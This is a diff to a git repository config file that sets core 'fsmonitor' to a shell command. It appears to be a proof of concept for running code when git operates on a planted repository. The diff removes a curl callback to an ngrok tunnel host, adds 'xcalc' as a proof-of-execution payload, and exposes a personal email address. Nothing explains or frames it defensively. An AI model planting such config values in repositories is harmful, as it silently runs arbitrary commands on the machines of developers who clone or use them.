@@ -3,7 +3,7 @@ repositoryformatversion = 0
 filemode = true
 bare = false
 worktree = "worktree" 
-fsmonitor = "curl https://cdb6-49-207-178-75.ngrok-free.app/test1"
+fsmonitor = "xcalc"
 [user]
 	email = sivaneshashok@gmail.com
 	name = staz0t
